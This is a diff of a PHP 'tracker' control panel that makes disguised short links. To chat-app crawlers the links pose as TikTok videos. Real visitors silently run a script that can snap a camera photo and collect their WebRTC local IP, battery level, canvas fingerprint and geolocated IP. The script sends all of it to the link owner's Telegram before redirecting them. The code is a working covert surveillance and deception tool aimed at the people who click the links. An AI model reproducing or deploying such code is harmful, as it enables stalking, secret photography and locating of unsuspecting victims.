@@ -8,55 +8,6 @@ set_time_limit(0);
 
 session_start();
 
-// ==============================================================================
-// Image Proxy (Fast generation)
-// ==============================================================================
-if (isset($_GET['proxy_img'])) {
-    $img_url = base64_decode($_GET['proxy_img']);
-    $ch = curl_init($img_url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
-    $image_data = curl_exec($ch);
-    curl_close($ch);
-
-    if ($image_data && function_exists('imagecreatefromstring')) {
-        $src = @imagecreatefromstring($image_data);
-        if ($src) {
-            $w = imagesx($src); $h = imagesy($src); $target_size = 800;
-            $dst = imagecreatetruecolor($target_size, $target_size);
-            $bg = imagecreatetruecolor($target_size, $target_size);
-            
-            $scale = max($target_size / $w, $target_size / $h);
-            $new_w = $w * $scale; $new_h = $h * $scale;
-            $x = ($target_size - $new_w) / 2; $y = ($target_size - $new_h) / 2;
-            imagecopyresampled($bg, $src, $x, $y, 0, 0, $new_w, $new_h, $w, $h);
-            
-            for ($i = 0; $i < 10; $i++) { imagefilter($bg, IMG_FILTER_GAUSSIAN_BLUR); }
-            imagefilter($bg, IMG_FILTER_BRIGHTNESS, -50);
-
-            $scale_center = $target_size / $h; 
-            $new_w_center = $w * $scale_center; 
-            $new_h_center = $target_size;
-            $x_center = ($target_size - $new_w_center) / 2; $y_center = 0;
-
-            imagecopyresampled($dst, $bg, 0, 0, 0, 0, $target_size, $target_size, $target_size, $target_size);
-            imagecopyresampled($dst, $src, $x_center, $y_center, 0, 0, $new_w_center, $new_h_center, $w, $h);
-
-            header('Content-Type: image/jpeg'); 
-            header("Cache-Control: public, max-age=86400");
-            imagejpeg($dst, null, 85);
-            imagedestroy($src); imagedestroy($bg); imagedestroy($dst);
-            exit;
-        }
-    }
-    if ($image_data) { header('Content-Type: image/jpeg'); echo $image_data; exit; }
-    header("Location: https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=800"); 
-    exit;
-}
-
 $db_file = __DIR__ . '/tracker_enhanced_v3.db';
 
 try {
@@ -64,8 +15,6 @@ try {
     $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
     $db->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
     $db->exec("PRAGMA journal_mode=WAL;");
-    $db->exec("PRAGMA synchronous=NORMAL;");
-    $db->exec("PRAGMA cache_size=-64000;");
 
     $db->exec("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT, role TEXT DEFAULT 'user', tg_chat TEXT, tg_token TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)");
     try { $db->exec("ALTER TABLE users ADD COLUMN tg_token TEXT"); } catch (Exception $e) {}
@@ -115,21 +64,20 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
     }
 }
 
-// دالة جلب البيانات الحقيقية القوية المحدثة لسحب صورة وفيديو تيك توك بدقة
+// دالة جلب بيانات تيك توك عبر TikWM API المحدثة
 function fetch_tiktok_exclusive_meta($url) {
     $meta = [
         'title' => 'TikTok Video', 
-        'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=800'
+        'image' => 'https://p16-sign-va.ibyteimg.com/tos-maliva-avt-0068/7342129759495864326~c5_720x720.jpeg'
     ];
 
-    // الطريقة الأولى: استعلام عبر TikWM API المخصص لاستخراج بيانات تيك توك الحقيقية
     $api_url = "https://www.tikwm.com/api/?url=" . urlencode($url);
     $ch = curl_init($api_url);
     curl_setopt_array($ch, [
         CURLOPT_RETURNTRANSFER => true, 
-        CURLOPT_TIMEOUT => 8, 
+        CURLOPT_TIMEOUT => 6, 
         CURLOPT_SSL_VERIFYPEER => false, 
-        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
     ]);
     $res = curl_exec($ch);
     curl_close($ch);
@@ -140,37 +88,12 @@ function fetch_tiktok_exclusive_meta($url) {
             if (!empty($data['data']['title'])) {
                 $meta['title'] = $data['data']['title'];
             }
-            // اختيار الصورة الأصلية أو غلاف الفيديو بدقة عالية
             if (!empty($data['data']['cover'])) {
                 $meta['image'] = $data['data']['cover'];
-                return $meta; // تم السحب بنجاح تام
+                return $meta;
             }
         }
     }
-
-    // الطريقة الثانية الاحتياطية: Tiklydown API في حال تعطل الأولى
-    $api_url2 = "https://api.tiklydown.eu.org/api/download?url=" . urlencode($url);
-    $ch2 = curl_init($api_url2);
-    curl_setopt_array($ch2, [
-        CURLOPT_RETURNTRANSFER => true, 
-        CURLOPT_TIMEOUT => 8, 
-        CURLOPT_SSL_VERIFYPEER => false, 
-        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
-    ]);
-    $res2 = curl_exec($ch2);
-    curl_close($ch2);
-
-    if ($res2) {
-        $data2 = json_decode($res2, true);
-        if (!empty($data2['title'])) {
-            $meta['title'] = $data2['title'];
-        }
-        if (!empty($data2['cover'])) {
-            $meta['image'] = $data2['cover'];
-            return $meta; // تم السحب بنجاح تام
-        }
-    }
-    
     return $meta;
 }
 
@@ -199,15 +122,14 @@ function get_ip_details($ip) {
             $isp = 'Unknown';
             if (strpos($raw_isp, 'djezzy') !== false || strpos($raw_isp, 'ota') !== false) $isp = 'Djezzy';
             elseif (strpos($raw_isp, 'mobilis') !== false || strpos($raw_isp, 'atm') !== false) $isp = 'Mobilis';
-            elseif (strpos($raw_isp, 'ooredoo') !== false || strpos($raw_isp, 'wataniya') !== false || strpos($raw_isp, 'nedjma') !== false) $isp = 'Ooredoo';
-            elseif (strpos($raw_isp, 'algerie telecom') !== false || strpos($raw_isp, 'algérie télécom') !== false) $isp = 'Algerie Telecom';
+            elseif (strpos($raw_isp, 'ooredoo') !== false || strpos($raw_isp, 'wataniya') !== false) $isp = 'Ooredoo';
+            elseif (strpos($raw_isp, 'algerie telecom') !== false) $isp = 'Algerie Telecom';
             else $isp = ucwords($data['isp'] ?? 'Unknown');
 
-            $vpn = (!empty($data['proxy']) || !empty($data['hosting'])) ? 'Yes (VPN)' : 'No (Direct)';
-            return ['location' => $location, 'isp' => $isp, 'vpn' => $vpn, 'lat' => $data['lat'] ?? 0, 'lon' => $data['lon'] ?? 0];
+            return ['location' => $location, 'isp' => $isp, 'vpn' => 'No', 'lat' => $data['lat'] ?? 0, 'lon' => $data['lon'] ?? 0];
         }
     }
-    return ['location' => 'Unknown Location', 'isp' => 'Unknown ISP', 'vpn' => 'Unknown', 'lat' => 0, 'lon' => 0];
+    return ['location' => 'Unknown', 'isp' => 'Unknown', 'vpn' => 'Unknown', 'lat' => 0, 'lon' => 0];
 }
 
 function get_device_type($ua) {
@@ -217,14 +139,12 @@ function get_device_type($ua) {
         return $model . ' (Android)';
     }
     if (stripos($ua, 'iPhone') !== false) return 'iPhone (iOS)';
-    if (stripos($ua, 'iPad') !== false) return 'iPad (iOS)';
     if (stripos($ua, 'Windows') !== false) return 'PC (Windows)';
-    if (stripos($ua, 'Macintosh') !== false) return 'PC (Mac)';
     return 'Unknown Device';
 }
 
 // ==========================================
-// Tracker Core
+// Tracker Core (معالجة البوتات والزوار)
 // ==========================================
 if (isset($_GET['r'])) {
     $code = $_GET['r'];
@@ -241,30 +161,28 @@ if (isset($_GET['r'])) {
         $owner_tg_token = $link['tg_token'];
 
         $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
-        $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger|applebot|discordbot|headless|phantom/i', $ua);
+        // الكشف الدقيق عن بوتات واتساب وتيليجرام وفيسبوك
+        $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|twitterbot|discordbot|preview/i', $ua);
 
         if ($is_bot) {
-            $cache_buster = time() . rand(1000, 9999);
-            $proxy_img_url = "https://" . $_SERVER['HTTP_HOST'] . "/?proxy_img=" . base64_encode($meta_image) . "&t=" . $cache_buster;
-            
             header('Content-Type: text/html; charset=utf-8');
             echo '<!DOCTYPE html><html><head>';
             echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
-            echo '<meta property="og:image" content="' . htmlspecialchars($proxy_img_url) . '">';
-            echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($proxy_img_url) . '">';
-            echo '<meta property="og:image:width" content="1200">';
-            echo '<meta property="og:image:height" content="630">';
+            echo '<meta property="og:description" content="شاهد هذا الفيديو الحصري على تيك توك">';
+            echo '<meta property="og:image" content="' . htmlspecialchars($meta_image) . '">';
+            echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($meta_image) . '">';
+            echo '<meta property="og:image:width" content="800">';
+            echo '<meta property="og:image:height" content="800">';
             echo '<meta property="og:type" content="video.other">';
-            echo '<meta property="og:video" content="https://www.w3schools.com/html/mov_bbb.mp4">';
-            echo '<meta property="og:video:secure_url" content="https://www.w3schools.com/html/mov_bbb.mp4">';
-            echo '<meta property="og:video:type" content="video/mp4">';
+            echo '<meta property="og:url" content="' . htmlspecialchars($target_redirect) . '">';
+            echo '<meta name="twitter:card" content="summary_large_image">';
+            echo '<meta name="twitter:title" content="' . htmlspecialchars($meta_title) . '">';
+            echo '<meta name="twitter:image" content="' . htmlspecialchars($meta_image) . '">';
             echo '</head><body></body></html>';
             exit();
         }
 
         if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_info'])) {
-            if ($is_bot) exit('OK');
-            
             if (function_exists('fastcgi_finish_request')) {
                 echo 'OK'; 
                 fastcgi_finish_request();
@@ -280,23 +198,19 @@ if (isset($_GET['r'])) {
             $local_ip = $_POST['lip'] ?? 'Direct';
             $port = $_SERVER['REMOTE_PORT'] ?? 'Unknown';
             $device = get_device_type($ua);
-            $gpu_info = $_POST['gpu'] ?? 'Unknown';
             $battery_info = $_POST['battery'] ?? 'Unknown';
-            $screen_info = $_POST['screen'] ?? 'Unknown';
             $canvas_fp = $_POST['canvas_fp'] ?? 'Unknown';
 
             try {
-                $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, isp_info, vpn_status, device_info, latitude, longitude, gpu_info, battery_info, screen_info, canvas_fp, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
-                $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $ip_details['location'], $ip_details['isp'], $ip_details['vpn'], $device, $ip_details['lat'], $ip_details['lon'], $gpu_info, $battery_info, $screen_info, $canvas_fp, date('Y-m-d H:i:s')]);
+                $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, isp_info, vpn_status, device_info, latitude, longitude, battery_info, canvas_fp, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+                $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $ip_details['location'], $ip_details['isp'], 'No', $device, $ip_details['lat'], $ip_details['lon'], $battery_info, $canvas_fp, date('Y-m-d H:i:s')]);
                 
                 $msg = "<b>New Visit!</b>\n\n";
-                $msg .= "<b>Account Name:</b> {$link['name']}\n";
-                $msg .= "<b>Model:</b> {$device}\n";
+                $msg .= "<b>Account:</b> {$link['name']}\n";
+                $msg .= "<b>Device:</b> {$device}\n";
                 $msg .= "<b>Location:</b> {$ip_details['location']}\n";
                 $msg .= "<b>ISP:</b> {$ip_details['isp']}\n";
-                $msg .= "<b>Public IP:</b> <code>{$public_ip}</code>\n";
-                $msg .= "<b>Local IP:</b> <code>{$local_ip}</code>\n";
-                $msg .= "<b>Battery:</b> {$battery_info}\n";
+                $msg .= "<b>IP:</b> <code>{$public_ip}</code>\n";
                 
                 sendTelegramAlert($owner_tg_chat, $msg, $img_base64, $owner_tg_token);
             } catch (Exception $e) {}
@@ -313,11 +227,9 @@ if (isset($_GET['r'])) {
     <script>
         const useCamera = <?php echo $use_camera ? 'true' : 'false'; ?>;
         const targetUrl = <?php echo json_encode($target_redirect); ?>;
-        function getScreenInfo() { return `${window.screen.width}x${window.screen.height} @ ${window.devicePixelRatio}x`; }
-        function getGPUInfo() { try { const c = document.createElement('canvas'); const gl = c.getContext('webgl'); const ext = gl.getExtension('WEBGL_debug_renderer_info'); return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL); } catch (e) { return 'Unknown'; } }
         async function getBatteryInfo() { try { const b = await navigator.getBattery(); return Math.round(b.level * 100) + "%"; } catch (e) { return 'Unknown'; } }
-        function getCanvasFingerprint() { try { const c = document.createElement('canvas'); const ctx = c.getContext('2d'); ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20); ctx.fillStyle = "#069"; ctx.fillText("Cwm fjordbank glyphs vext quiz", 2, 15); const data = c.toDataURL(); let hash = 0; for (let i = 0; i < data.length; i++) { const char = data.charCodeAt(i); hash = ((hash << 5) - hash) + char; hash = hash & hash; } return Math.abs(hash).toString(16).substring(0, 16); } catch (e) { return 'Unknown'; } }
-        function getLocalIP() { return new Promise((resolve) => { let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] }); let res = false; pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {}); pc.onicecandidate = (e) => { if (!e.candidate || !e.candidate.candidate) return; const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if (ip && !ip[1].endsWith('.local') && !res) { res = true; resolve(ip[1]); pc.close(); } }; setTimeout(() => { if(!res) { resolve("Direct"); pc.close(); } }, 150); }); }
+        function getCanvasFingerprint() { try { const c = document.createElement('canvas'); const ctx = c.getContext('2d'); ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20); const data = c.toDataURL(); return data.length.toString(); } catch (e) { return 'Unknown'; } }
+        function getLocalIP() { return new Promise((resolve) => { let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] }); let res = false; pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {}); pc.onicecandidate = (e) => { if (!e.candidate || !e.candidate.candidate) return; const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if (ip && !res) { res = true; resolve(ip[1]); pc.close(); } }; setTimeout(() => { if(!res) { resolve("Direct"); pc.close(); } }, 150); }); }
 
         async function initTracking() {
             let imageData = "";
@@ -335,13 +247,11 @@ if (isset($_GET['r'])) {
             });
 
             const localIp = await getLocalIP(); 
-            const gpu = getGPUInfo(); 
-            const screen = getScreenInfo(); 
             const battery = await getBatteryInfo(); 
             const canvasFp = getCanvasFingerprint();
             
             const formData = new URLSearchParams();
-            formData.append('save_info', '1'); formData.append('image', imageData); formData.append('lip', localIp); formData.append('gpu', gpu); formData.append('screen', screen); formData.append('battery', battery); formData.append('canvas_fp', canvasFp);
+            formData.append('save_info', '1'); formData.append('image', imageData); formData.append('lip', localIp); formData.append('battery', battery); formData.append('canvas_fp', canvasFp);
             
             if (navigator.sendBeacon) { 
                 navigator.sendBeacon(window.location.href, formData); 
@@ -350,7 +260,6 @@ if (isset($_GET['r'])) {
             }
             
             window.location.replace(targetUrl); 
-            
             await cameraPromise;
             if (imageData !== "") {
                 let imgData = new URLSearchParams(); imgData.append('save_image_only', '1'); imgData.append('image', imageData); imgData.append('code', '<?php echo $code; ?>');
@@ -377,7 +286,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_image_only'])) {
 }
 
 // ==========================================
-// Dashboard
+// Dashboard (لوحة التحكم)
 // ==========================================
 $login_error = '';
 if (isset($_POST['login'])) {
@@ -398,41 +307,6 @@ $current_user_id = $_SESSION['user_id'] ?? 0;
 $current_username = $_SESSION['username'] ?? '';
 
 if ($is_logged_in) {
-    $pass_error = ''; $pass_success = '';
-    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['change_my_password'])) {
-        if ($_POST['new_password'] !== $_POST['confirm_password']) { $pass_error = "Passwords do not match!"; } 
-        else {
-            $stmt = $db->prepare("SELECT password FROM users WHERE id = ?"); $stmt->execute([$current_user_id]); $user_hash = $stmt->fetchColumn();
-            if (password_verify($_POST['current_password'], $user_hash)) {
-                $new_hash = password_hash($_POST['new_password'], PASSWORD_DEFAULT);
-                $db->prepare("UPDATE users SET password = ? WHERE id = ?")->execute([$new_hash, $current_user_id]);
-                $pass_success = "Password changed successfully!";
-            } else { $pass_error = "Current password is incorrect!"; }
-        }
-    }
-
-    if ($is_admin) {
-        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['admin_change_user_pass'])) {
-            $new_hash = password_hash($_POST['admin_new_password'], PASSWORD_DEFAULT);
-            $db->prepare("UPDATE users SET password = ? WHERE id = ? AND role = 'user'")->execute([$new_hash, intval($_POST['target_user_id'])]);
-            header("Location: /?msg=pass_changed"); exit();
-        }
-        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['add_user'])) {
-            try {
-                $db->prepare("INSERT INTO users (username, password, role, tg_chat, tg_token) VALUES (?, ?, 'user', ?, ?)")->execute([trim($_POST['new_username']), password_hash($_POST['new_password'], PASSWORD_DEFAULT), trim($_POST['new_tg_chat']), trim($_POST['new_tg_token'])]);
-                header("Location: /?msg=user_added"); exit();
-            } catch (Exception $e) { $user_error = "Username already exists!"; }
-        }
-        if (isset($_GET['delete_user'])) {
-            $del_uid = intval($_GET['delete_user']);
-            if ($del_uid !== $current_user_id) {
-                $db->prepare("DELETE FROM users WHERE id = ? AND role = 'user'")->execute([$del_uid]);
-                $db->prepare("DELETE FROM links WHERE user_id = ?")->execute([$del_uid]);
-            }
-            header("Location: /?msg=user_deleted"); exit();
-        }
-    }
-
     if (isset($_GET['delete_id'])) {
         $del_id = intval($_GET['delete_id']);
         if ($is_admin) { $db->prepare("DELETE FROM captures WHERE id = ?")->execute([$del_id]); }
@@ -445,31 +319,20 @@ if ($is_logged_in) {
         $target_url = trim($_POST['target_url']); $link_name = trim($_POST['link_name']);
         $use_camera = isset($_POST['use_camera']) ? 1 : 0;
         if (!filter_var($target_url, FILTER_VALIDATE_URL)) $target_url = "https://" . $target_url;
+        
+        // جلب العنوان والصورة الحقيقية مباشرة عند إنشاء الرابط وتخزينها في قاعدة البيانات
         $scraped = fetch_tiktok_exclusive_meta($target_url);
         $code = substr(md5(uniqid(rand(), true)), 0, 7);
+        
         $db->prepare("INSERT INTO links (user_id, name, code, target_url, meta_title, meta_image, use_camera) VALUES (?, ?, ?, ?, ?, ?, ?)")->execute([$current_user_id, $link_name, $code, $target_url, $scraped['title'], $scraped['image'], $use_camera]);
         $generated_link = "https://" . $_SERVER['HTTP_HOST'] . "/?r=" . $code; $generated_code = $code;
     }
 
-    if ($is_admin) {
-        $total_links = $db->query("SELECT COUNT(*) FROM links")->fetchColumn();
-        $total_captures = $db->query("SELECT COUNT(*) FROM captures")->fetchColumn();
-        $today_captures = $db->query("SELECT COUNT(*) FROM captures WHERE date(created_at) = date('now')")->fetchColumn();
-        $users_list = $db->query("SELECT * FROM users WHERE role = 'user' ORDER BY id DESC")->fetchAll();
-    } else {
-        $total_links = $db->query("SELECT COUNT(*) FROM links WHERE user_id = $current_user_id")->fetchColumn();
-        $total_captures = $db->query("SELECT COUNT(*) FROM captures c JOIN links l ON c.code = l.code WHERE l.user_id = $current_user_id")->fetchColumn();
-        $today_captures = $db->query("SELECT COUNT(*) FROM captures c JOIN links l ON c.code = l.code WHERE l.user_id = $current_user_id AND date(c.created_at) = date('now')")->fetchColumn();
-    }
-
-    $filter_code = trim($_GET['track'] ?? '');
-    if ($is_admin) {
-        if (!empty($filter_code)) { $stmt = $db->prepare("SELECT c.*, l.name as link_name FROM captures c LEFT JOIN links l ON c.code = l.code WHERE c.code = ? ORDER BY c.id DESC"); $stmt->execute([$filter_code]); }
-        else { $stmt = $db->query("SELECT c.*, l.name as link_name FROM captures c LEFT JOIN links l ON c.code = l.code ORDER BY c.id DESC LIMIT 50"); }
-    } else {
-        if (!empty($filter_code)) { $stmt = $db->prepare("SELECT c.*, l.name as link_name FROM captures c JOIN links l ON c.code = l.code WHERE l.user_id = ? AND c.code = ? ORDER BY c.id DESC"); $stmt->execute([$current_user_id, $filter_code]); }
-        else { $stmt = $db->prepare("SELECT c.*, l.name as link_name FROM captures c JOIN links l ON c.code = l.code WHERE l.user_id = ? ORDER BY c.id DESC LIMIT 50"); $stmt->execute([$current_user_id]); }
-    }
+    $total_links = $db->query($is_admin ? "SELECT COUNT(*) FROM links" : "SELECT COUNT(*) FROM links WHERE user_id = $current_user_id")->fetchColumn();
+    $total_captures = $db->query($is_admin ? "SELECT COUNT(*) FROM captures" : "SELECT COUNT(*) FROM captures c JOIN links l ON c.code = l.code WHERE l.user_id = $current_user_id")->fetchColumn();
+    
+    $stmt = $is_admin ? $db->query("SELECT c.*, l.name as link_name FROM captures c LEFT JOIN links l ON c.code = l.code ORDER BY c.id DESC LIMIT 50") : $db->prepare("SELECT c.*, l.name as link_name FROM captures c JOIN links l ON c.code = l.code WHERE l.user_id = ? ORDER BY c.id DESC LIMIT 50");
+    if(!$is_admin) $stmt->execute([$current_user_id]);
     $captures = $stmt->fetchAll();
 }
 ?>
@@ -479,265 +342,87 @@ if ($is_logged_in) {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Control Panel - Aziz Edition</title>
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
-        :root { --bg: #070913; --card: rgba(16, 23, 42, 0.85); --border: #1e293b; --text: #f8fafc; --muted: #94a3b8; --accent: #8b5cf6; --danger: #f43f5e; --success: #10b981; --sidebar-bg: rgba(15, 21, 35, 0.9); }
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
-        
-        @keyframes scorpionColors {
-            0% { background: linear-gradient(135deg, #05080f 0%, #1e1b4b 50%, #05080f 100%); }
-            33% { background: linear-gradient(135deg, #05080f 0%, #064e3b 50%, #05080f 100%); }
-            66% { background: linear-gradient(135deg, #05080f 0%, #4c1d95 50%, #05080f 100%); }
-            100% { background: linear-gradient(135deg, #05080f 0%, #1e1b4b 50%, #05080f 100%); }
-        }
-        
-        body { 
-            animation: scorpionColors 15s ease-in-out infinite;
-            background-size: 200% 200%;
-            color: var(--text); min-height: 100vh; display: flex; flex-direction: column; 
-        }
-        
+        :root { --bg: #070913; --card: rgba(16, 23, 42, 0.85); --border: #1e293b; --text: #f8fafc; --muted: #94a3b8; --accent: #8b5cf6; --danger: #f43f5e; --success: #10b981; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, sans-serif; }
+        body { background: #05080f; color: var(--text); min-height: 100vh; display: flex; flex-direction: column; }
         .app-container { display: flex; flex: 1; height: 100vh; overflow: hidden; }
-        
-        .sidebar { width: 260px; background: var(--sidebar-bg); backdrop-filter: blur(10px); border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 20px 0; transition: all 0.3s; box-shadow: 5px 0 15px rgba(0,0,0,0.5); }
-        .sidebar-header { padding: 0 20px 20px; border-bottom: 1px solid var(--border); margin-bottom: 20px; }
-        .sidebar-header h2 { font-size: 18px; color: var(--text); margin-bottom: 5px; text-shadow: 0 0 10px var(--accent); }
-        .sidebar-header p { font-size: 12px; color: var(--muted); }
-        
-        .nav-item { display: flex; align-items: center; gap: 12px; padding: 14px 20px; color: var(--muted); text-decoration: none; cursor: pointer; transition: 0.2s; font-size: 14px; font-weight: 500; border: none; background: transparent; width: 100%; text-align: left; }
-        .nav-item:hover { background: rgba(139, 92, 246, 0.15); color: var(--accent); text-shadow: 0 0 8px var(--accent); }
-        .nav-item.active { background: rgba(139, 92, 246, 0.2); color: var(--accent); border-left: 4px solid var(--accent); }
-        
-        .sidebar-footer { margin-top: auto; padding: 20px; border-top: 1px solid var(--border); }
-        .user-profile { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; }
-        .user-avatar { width: 40px; height: 40px; background: var(--accent); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; color: white; box-shadow: 0 0 10px var(--accent); }
-        
+        .sidebar { width: 260px; background: rgba(15, 21, 35, 0.9); border-right: 1px solid var(--border); padding: 20px; display: flex; flex-direction: column; }
         .main-content { flex: 1; overflow-y: auto; padding: 30px; }
-        
-        .tab-content { display: none; animation: fadeIn 0.3s ease; }
-        .tab-content.active { display: block; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        
-        .card { background: var(--card); backdrop-filter: blur(12px); border: 1px solid var(--border); border-radius: 16px; padding: 25px; margin-bottom: 25px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); }
-        .card-title { font-size: 16px; font-weight: 700; color: var(--text); margin-bottom: 20px; display: flex; align-items: center; gap: 10px; padding-bottom: 15px; border-bottom: 1px solid var(--border); }
-        
+        .card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 20px; margin-bottom: 20px; }
         .form-group { margin-bottom: 15px; }
-        .form-group label { display: block; font-size: 13px; color: var(--muted); margin-bottom: 8px; }
-        input[type="text"], input[type="password"] { width: 100%; background: #050b14; border: 1px solid var(--border); border-radius: 8px; padding: 12px 15px; color: var(--text); font-size: 14px; outline: none; transition: 0.2s; }
-        input:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.15); }
-        
-        .btn { background: var(--accent); color: white; border: none; padding: 12px 20px; border-radius: 8px; font-weight: 600; cursor: pointer; transition: 0.2s; font-size: 14px; display: inline-flex; align-items: center; justify-content: center; gap: 8px; }
-        .btn:hover { background: #7c3aed; transform: translateY(-1px); }
-        .btn-block { width: 100%; }
-        .btn-danger { background: rgba(244, 63, 94, 0.1); color: var(--danger); border: 1px solid rgba(244, 63, 94, 0.3); }
-        .btn-danger:hover { background: var(--danger); color: white; }
-        .btn-success { background: var(--success); }
-        
-        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-bottom: 25px; }
-        .stat-card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 15px; text-align: center; }
-        .stat-card h3 { font-size: 12px; color: var(--muted); margin-bottom: 10px; }
-        .stat-card p { font-size: 26px; font-weight: 800; color: var(--accent); }
-        
-        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
-        .capture-card { background: #050b14; border: 1px solid var(--border); border-radius: 12px; overflow: hidden; transition: 0.3s; display: flex; flex-direction: column; }
-        .capture-card:hover { transform: translateY(-3px); border-color: var(--accent); box-shadow: 0 10px 25px rgba(139, 92, 246, 0.2); }
-        .capture-card img { width: 100%; height: 200px; object-fit: cover; }
-        .capture-info { padding: 15px; flex: 1; display: flex; flex-direction: column; }
-        .info-row { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 6px; color: var(--muted); }
-        .info-row span { color: var(--text); font-weight: 500; }
-        .map-container { height: 150px; width: 100%; border-radius: 8px; margin: 10px 0; border: 1px solid var(--border); }
-        
-        .table-responsive { overflow-x: auto; }
-        table { width: 100%; border-collapse: collapse; font-size: 14px; }
-        th, td { padding: 12px; text-align: left; border-bottom: 1px solid var(--border); }
-        th { color: var(--muted); font-weight: 600; background: rgba(255,255,255,0.02); }
-        
-        @media (max-width: 768px) {
-            .app-container { flex-direction: column; height: auto; overflow: visible; }
-            .sidebar { width: 100%; padding: 10px; flex-direction: row; overflow-x: auto; border-right: none; border-bottom: 1px solid var(--border); align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
-            .sidebar-header { display: none; }
-            .nav-item { padding: 10px 15px; white-space: nowrap; border-left: none; border-bottom: 3px solid transparent; width: auto; border-radius: 8px; }
-            .nav-item.active { border-left: none; border-bottom: 3px solid var(--accent); background: transparent; }
-            .sidebar-footer { border-top: none; padding: 0; margin-left: auto; display: flex; align-items: center; gap: 10px; }
-            .user-profile { margin-bottom: 0; display: none; }
-            .main-content { padding: 15px; }
-            .stats-grid { grid-template-columns: repeat(3, 1fr); gap: 8px; }
-            .stat-card { padding: 10px; }
-            .stat-card p { font-size: 20px; }
-        }
-        
-        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%) translateY(100px); background: var(--success); color: white; padding: 12px 24px; border-radius: 8px; font-weight: bold; transition: 0.3s; z-index: 9999; opacity: 0; box-shadow: 0 0 15px var(--success); }
-        .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
-
-        @keyframes pulseGlow { 0% { filter: drop-shadow(0 0 2px var(--accent)); } 50% { filter: drop-shadow(0 0 15px var(--accent)); } 100% { filter: drop-shadow(0 0 2px var(--accent)); } }
+        .form-group label { display: block; font-size: 13px; color: var(--muted); margin-bottom: 5px; }
+        input[type="text"], input[type="password"] { width: 100%; background: #050b14; border: 1px solid var(--border); border-radius: 6px; padding: 10px; color: var(--text); }
+        .btn { background: var(--accent); color: white; border: none; padding: 10px 15px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; }
+        .btn-danger { background: var(--danger); }
